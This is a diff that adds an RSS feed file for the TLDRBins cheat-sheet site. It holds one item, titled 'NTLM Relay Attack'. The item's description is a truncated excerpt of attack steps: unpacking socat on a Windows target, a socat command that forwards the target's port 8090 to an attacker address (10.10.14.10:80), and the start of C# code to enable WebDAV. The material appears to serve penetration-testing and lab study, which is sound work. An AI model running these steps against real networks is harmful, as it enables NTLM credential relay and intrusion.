@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Tgt on TLDRBins</title>
+    <link>https://tldrbins.github.io/@tgt/</link>
+    <description>Recent content in Tgt on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@tgt/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>NTLM Relay Attack</title>
+      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
+      <description>1. Run socat to redirect traffic (In Windows Target) socat&#xA;# Upload socat.zip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80 2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
+    </item>
+  </channel>
+</rss>
